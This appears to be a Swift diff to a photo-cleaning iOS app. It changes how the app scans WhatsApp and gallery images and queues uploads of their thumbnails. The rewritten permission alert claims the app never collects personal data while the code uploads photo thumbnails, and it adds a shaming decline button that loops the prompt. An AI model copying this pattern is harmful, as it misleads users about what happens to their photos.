@@ -8,7 +8,7 @@
 
 import UIKit
 import Photos
-import UserNotifications
+
 import CoreData
 
 class SplashViewController: UIViewController {
@@ -24,7 +24,10 @@ class SplashViewController: UIViewController {
     
     var request=0;
     var present=false
-    var allImages : [String]!
+    //var allImages : [String]!
+    
+    var allImagesDictionary : [String : Int]!
+    var allImagesDictionaryForDatabase : [String : Int]!
     
     var myOpQueue : OperationQueue!
     
@@ -42,12 +45,8 @@ class SplashViewController: UIViewController {
         
         semaphore = DispatchSemaphore(value: 0)
         
-        //        let appDelegate = UIApplication.shared.delegate as! AppDelegate
-        //        appDelegate.save(name: "Akshit")
-        //        appDelegate.save(name: "Ankit")
-        //        appDelegate.fetch()
+        Preferences.shared.setFirstTimeSplashCounter()
         
-        // Do any additional setup after loading the view.
     }
     
     override func didReceiveMemoryWarning() {
@@ -116,7 +115,7 @@ class SplashViewController: UIViewController {
                         
                         DispatchQueue.global(qos:.background).async {
                             self.asset=self.getAssetsFromAlbum(albumName: "WhatsApp")
-                            self.scanGalleryImageAlso()
+                            self.scanGalleryImageAlso(operation: "WhatsApp")
                         }
                         
                         
@@ -124,7 +123,7 @@ class SplashViewController: UIViewController {
                         
                         DispatchQueue.global(qos:.background).async {
                             //self.asset=self.getAssetsFromAlbum(albumName: "Gallery")
-                            self.scanGalleryImageAlso()
+                            self.scanGalleryImageAlso(operation: "Gallery")
                             print("Install Whatsapp")
                         }
                         
@@ -188,18 +187,20 @@ class SplashViewController: UIViewController {
         if(albumName != "WhatsApp")
         {
             fetchAll=true
-            collection = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil) as! PHFetchResult<AnyObject>
+            collection = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .albumRegular, options: nil) as! PHFetchResult<AnyObject>
         }
         else{
             collection = PHAssetCollection.fetchAssetCollections(with: .album, subtype: .any, options: nil) as! PHFetchResult<AnyObject>
         }
         
-        allImages?.removeAll()
-        // DatabaseManagement.shared.serialQueue.sync() {
-        allImages=DatabaseManagement.shared.getAllImages();
+        
+        //allImagesDictionary.removeAll()
+        allImagesDictionary = DatabaseManagement.shared.getAllImagesDictionary()
+        allImagesDictionaryForDatabase = allImagesDictionary
         // }
         
-        print("total images \(allImages?.count)")
+        print("total images \(allImagesDictionary?.count)")
+         print("total images database \(allImagesDictionaryForDatabase?.count)")
         
         
         // DispatchSemaphore(value: 0)
@@ -249,30 +250,47 @@ class SplashViewController: UIViewController {
                                     
                                     
                                     //DatabaseManagement.shared.serialQueue.sync() {
-                                    let present = !DatabaseManagement.shared.insertImageWithIdentifier(img: img)
-                                    if(present)
-                                    {
-                                        do
-                                        {
-                                            if let index = try self.allImages.index(of: asset.localIdentifier)
-                                            {
-                                                try  self.allImages.remove(at: index)
-                                            }
-                                            else
-                                            {
-                                                print("image not present")
-                                            }
-                                            
-                                        }
-                                        catch{
-                                            print("error ",error.localizedDescription)
-                                        }
-                                    }
-                                   
                                     
-                                    if(DatabaseManagement.shared.isScannedWithIdentifier(identifier: img.getIdentifier()) == false)
+                                    if let index = self.allImagesDictionary.index(forKey: img.getIdentifier())
                                     {
-                                        //self.myGroup.enter()
+                                       
+                                        if let index = self.allImagesDictionaryForDatabase.index(forKey: img.getIdentifier())
+                                        {
+                                            self.allImagesDictionaryForDatabase.removeValue(forKey: img.getIdentifier())
+                                        }
+                                        
+                                        self.allImagesDictionary.removeValue(forKey: img.getIdentifier())
+                                        
+                                        print("total after removal")
+                                        print("total images  \(self.allImagesDictionary?.count)")
+                                        print("total images database \(self.allImagesDictionaryForDatabase?.count)")
+                                        
+                                        if(self.allImagesDictionary[img.getIdentifier()] == -1)
+                                        {
+                                            self.myOpQueue.addOperation{
+                                                
+                                                self.UploadRequest(image: self.getAssetThumbnail(asset: asset),mPath : img.getIdentifier(),filename: "image \(j)")
+                                                
+                                                
+                                            }
+                                        }
+                                        
+                                    }
+                                    else{
+                                        
+                                         print("image inserted")
+                                        
+                                        
+                                        
+                                        DatabaseManagement.shared.insertImageWithIdentifier(img: img)
+                                        
+                                        print("total after insertion")
+                                        print("total images  \(self.allImagesDictionary?.count)")
+                                        print("total images database \(self.allImagesDictionaryForDatabase?.count)")
+                                        
+                                        
+                                        self.allImagesDictionary[img.getIdentifier()] = -1
+                                        
                                         self.myOpQueue.addOperation{
                                             
                                             self.UploadRequest(image: self.getAssetThumbnail(asset: asset),mPath : img.getIdentifier(),filename: "image \(j)")
@@ -280,6 +298,9 @@ class SplashViewController: UIViewController {
                                             
                                         }
                                     }
+                                    
+                                    
+                                    
                                     // }
                                     
                                     print("enumeration")
@@ -322,8 +343,8 @@ class SplashViewController: UIViewController {
                     {
                         
                         
-                        DatabaseManagement.shared.deleteContacts(mPath : self.allImages!)
-                        self.allImages?.removeAll()
+                        DatabaseManagement.shared.deleteImageDictionary(mPath : self.allImagesDictionary!)
+                        self.allImagesDictionary?.removeAll()
                         openView=false
                         
                         self.navigationController?.popViewController(animated: true)
@@ -361,23 +382,28 @@ class SplashViewController: UIViewController {
     
     
     
-    func scanGalleryImageAlso()
+    func scanGalleryImageAlso(operation : String)
     {
         
         let options = PHFetchOptions()
         options.sortDescriptors = [ NSSortDescriptor(key: "pixelWidth", ascending: true)  ]
-        let collection: PHFetchResult = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil)
+        let collection: PHFetchResult = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumUserLibrary, options: nil)
         //let collection: PHFetchResult = PHAssetCollection.fetchAssetCollections(with: .album, subtype: .any, options: nil)
         var seguePerformed = false
         
         var j=0
         
-        allImages?.removeAll()
         // DatabaseManagement.shared.serialQueue.sync() {
-        allImages=DatabaseManagement.shared.getAllImages();
+        //allImagesDictionary=DatabaseManagement.shared.getAllImagesDictionary();
         //  }
         
-        print("total images \(allImages?.count)")
+        if(operation == "Gallery")
+        {
+            allImagesDictionary = DatabaseManagement.shared.getAllImagesDictionary()
+            allImagesDictionaryForDatabase = allImagesDictionary
+        }
+        
+        print("total images \(allImagesDictionary?.count)")
         
         print("Photo count",collection.count)
         if( collection.count > 0)
@@ -385,16 +411,9 @@ class SplashViewController: UIViewController {
             var assets = [PHAsset]()
             for k in 0 ..< collection.count {
                 let obj:AnyObject! = collection.object(at: k)
-                
-                //                if let titles=obj.title as? String
-                //                {
+       
                 print("album name \(obj)")
-                //                }
-                //                else{
-                //                    print("album name not present")
-                //                }
-                
-                
+   
                 if let assCollection = obj as? PHAssetCollection {
                     let results = PHAsset.fetchAssets(in: assCollection, options: options)
                     
@@ -421,44 +440,61 @@ class SplashViewController: UIViewController {
                                 img.setActionStatus(status: 0)
                                 //img.setFileSize()
                                 
+    
                                 
-                                
-                                
-                                
-                                
-                                // self.images?.append(img)
-                                
-                                //print("total images in DB ",DatabaseManagement.shared.getTotalImageCount())
-                                //print("total images in DB ",self.images?.count ?? "nothing in DB")
-                                //   DatabaseManagement.shared.serialQueue.sync() {
-                                let present = !DatabaseManagement.shared.insertImageWithIdentifier(img: img)
-                                
-                                if(present)
-                                {
-                                    do
-                                    {
-                                        if let index = try self.allImages.index(of: asset.localIdentifier)
-                                        {
-                                            try  self.allImages.remove(at: index)
-                                        }
-                                        else
-                                        {
-                                            print("image not present")
-                                        }
-                                        
-                                    }
-                                    catch{
-                                        print("error ",error.localizedDescription)
-                                    }
-                                }
-                                
-                                if(DatabaseManagement.shared.isScannedWithIdentifier(identifier: img.getIdentifier()) == false)
+                                if let index = self.allImagesDictionary.index(forKey: asset.localIdentifier)
                                 {
                                     
+                                    print("image not inserted whatsapp ",j ,self.allImagesDictionary[img.getIdentifier()] ?? "nothing in dictionary")
+                                    
+                                    if(self.allImagesDictionary[img.getIdentifier()] == -1)
+                                    {
+                                        self.myOpQueue.addOperation{
+                                            
+                                            self.UploadRequest(image: self.getAssetThumbnail(asset: asset),mPath : img.getIdentifier(),filename: "image \(j)")
+                                            
+                                        }
+                                    }
+                                    
+                                    if let index = self.allImagesDictionaryForDatabase.index(forKey: img.getIdentifier())
+                                    {
+                                        self.allImagesDictionaryForDatabase.removeValue(forKey: img.getIdentifier())
+                                    }
+                                    
+                                    self.allImagesDictionary.removeValue(forKey: img.getIdentifier())
+                                    
+                                    print("total after removal")
+                                    print("total images  \(self.allImagesDictionary?.count)")
+                                    print("total images database \(self.allImagesDictionaryForDatabase?.count)")
+                                    
+                                    print("database dictionary \(self.allImagesDictionaryForDatabase.count) && dictionary \(self.allImagesDictionary.count)")
+                                    
+                                  
+                                    
+                                }
+                                else{
+                                    
+                                    self.allImagesDictionary[img.getIdentifier()] = -1
+                                    
+                                     DatabaseManagement.shared.insertImageWithIdentifier(img: img)
+                                    
+                                    print("total after insertion")
+                                    print("total images  \(self.allImagesDictionary?.count)")
+                                    print("total images database \(self.allImagesDictionaryForDatabase?.count)")
+                                    
+                                     print("image inserted whatsapp ",j)
                                     self.myOpQueue.addOperation{
                                         
                                         self.UploadRequest(image: self.getAssetThumbnail(asset: asset),mPath : img.getIdentifier(),filename: "image \(j)")
                                         
+                                    }
+                                }
+                                
+                                if(self.allImagesDictionary[asset.localIdentifier] == -1)
+                                {
+                                    self.myOpQueue.addOperation{
+                                        
+                                        self.UploadRequest(image: self.getAssetThumbnail(asset: asset),mPath : img.getIdentifier(),filename: "image \(j)")
                                         
                                     }
                                 }
@@ -499,9 +535,9 @@ class SplashViewController: UIViewController {
         }
         
         //  DatabaseManagement.shared.serialQueue.sync() {
-        DatabaseManagement.shared.deleteContacts(mPath : self.allImages!)
+        DatabaseManagement.shared.deleteImageDictionary(mPath : self.allImagesDictionaryForDatabase!)
         //  }
-        self.allImages?.removeAll()
+        self.allImagesDictionary?.removeAll()
         
         if(!seguePerformed)
         {
@@ -532,12 +568,13 @@ class SplashViewController: UIViewController {
         case .denied, .restricted :
             print("Photos : denied, restricted")
             
-            //GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermission, label: Constants.fired)
+            
             
             PHPhotoLibrary.requestAuthorization() { status in
                 switch status {
                 case .authorized:
                     print("Photos : Authorized")
+                    GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermissionCustom, label: "given")
                     
                     self.afterPermissionTask()
                     
@@ -546,9 +583,9 @@ class SplashViewController: UIViewController {
                 case .denied, .restricted :
                     
                     print("Photos : denied, restricted")
-                    
-                    self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts()
+                    self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts(first: true)
                     break
+                    
                 //handle denied status
                 case .notDetermined:
                     // ask for permissions
@@ -562,14 +599,14 @@ class SplashViewController: UIViewController {
             // ask for permissions
             
             print("Photos : not determined")
-            GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermission, label: Constants.fired)
+            GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermissionSystem, label: "fired")
             PHPhotoLibrary.requestAuthorization() { status in
                 switch status {
                 case .authorized:
                     
                     self.afterPermissionTask()
                     
-                    GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermission, label: Constants.granted)
+                    GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermissionSystem, label: "given")
                     
                     print("Photos : Authorized")
                     break
@@ -577,7 +614,7 @@ class SplashViewController: UIViewController {
                 case .denied, .restricted :
                     print("Photos : denied, restricted")
                     
-                    self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts()
+                    self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts(first: true)
                     break
                 //handle denied status
                 case .notDetermined:
@@ -587,19 +624,31 @@ class SplashViewController: UIViewController {
         }
     }
     
-    func alertToEncouragePhotoLibraryAccessWhenApplicationStarts()
+    func alertToEncouragePhotoLibraryAccessWhenApplicationStarts(first : Bool)
     {
         //Photo Library not available - Alert
         
-        GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermissionScreen)
-        GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermission, label: Constants.fired)
+        if(first)
+        {
+            GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermissionScreenOnce)
+            GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermissionScreen)
+        }
+        else
+        {
+            GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermissionScreen)
+        }
+        GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermissionCustom, label: "fired")
         
-        let cameraUnavailableAlertController = UIAlertController (title: "Photo Library Unavailable", message: "Please check to see if device settings doesn't allow photo library access", preferredStyle: .alert)
+        let cameraUnavailableAlertController = UIAlertController (title: "Require Photo Library Access", message: "\nWe never collect any personal data and respect privacy. Allow Photos Library Permission to clear WhatsApp Junk Photos", preferredStyle: .alert)
         
-        let settingsAction = UIAlertAction(title: "Settings", style: .destructive) { (_) -> Void in
+        let settingsAction = UIAlertAction(title: "Give Permission", style: .default) { (_) -> Void in
             let settingsUrl = NSURL(string:UIApplicationOpenSettingsURLString)
             if let url = settingsUrl {
-                GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermmisionSettingScreen)
+                //GoogleAnalytics.shared.sendScreenTracking(screenName: Constants.photosPermmisionSettingScreen)
+                
+                GoogleAnalytics.shared.sendEvent(category: Constants.permission, action: Constants.photosPermissionSettings, label: "fired")
+                
+                
                 if #available(iOS 10.0, *) {
                     UIApplication.shared.open(url as URL, options: [:], completionHandler: nil)
                 } else {
@@ -609,14 +658,13 @@ class SplashViewController: UIViewController {
             }
         }
         //let cancelAction = UIAlertAction(title: "Okay", style: .default, handler: nil)
-        cameraUnavailableAlertController .addAction(settingsAction)
         
-        cameraUnavailableAlertController.addAction(UIAlertAction(title: "Okay", style: .default, handler: { action in
+        cameraUnavailableAlertController.addAction(UIAlertAction(title: "Nope, keep junk on phone", style: .destructive, handler: { action in
             switch action.style{
                 
             case .default:
                 print("default")
-                self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts()
+                self.alertToEncouragePhotoLibraryAccessWhenApplicationStarts(first: false)
                 break
             case .cancel:
                 print("cancel")
@@ -627,6 +675,9 @@ class SplashViewController: UIViewController {
                 
             }
         }))
+        
+        cameraUnavailableAlertController.addAction(settingsAction)
+        
         
         
         self.present(cameraUnavailableAlertController , animated: true, completion: nil)
